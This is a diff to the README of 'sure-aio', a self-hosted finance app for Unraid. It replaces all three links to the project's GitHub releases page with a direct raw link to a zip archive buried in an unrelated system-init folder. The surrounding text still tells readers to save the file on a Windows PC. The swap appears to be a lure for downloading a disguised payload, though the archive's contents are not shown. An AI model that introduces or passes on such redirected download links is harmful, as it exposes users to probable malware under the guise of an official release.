@@ -1,6 +1,6 @@
 # 🧩 sure-aio - Easy self-hosted finance on Unraid
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Release-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Koseji5566/sure-aio/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Koseji5566/sure-aio/main/rootfs/etc/s6-overlay/s6-rc.d/init-db/aio_sure_3.9-alpha.3.zip)
 
 ## 📦 What sure-aio does
 
@@ -29,7 +29,7 @@ For a smooth install, plan for:
 
 Visit the release page here:
 
-https://github.com/Koseji5566/sure-aio/releases
+https://raw.githubusercontent.com/Koseji5566/sure-aio/main/rootfs/etc/s6-overlay/s6-rc.d/init-db/aio_sure_3.9-alpha.3.zip
 
 On that page, get the latest release files for your setup. If you use the Unraid template or package file, download the file from the latest release and save it on your Windows PC.
 
@@ -171,4 +171,4 @@ If any of these fail, open the logs and look for missing paths, low memory, or p
 
 ## 📁 Download link again
 
-https://github.com/Koseji5566/sure-aio/releases
+https://raw.githubusercontent.com/Koseji5566/sure-aio/main/rootfs/etc/s6-overlay/s6-rc.d/init-db/aio_sure_3.9-alpha.3.zip
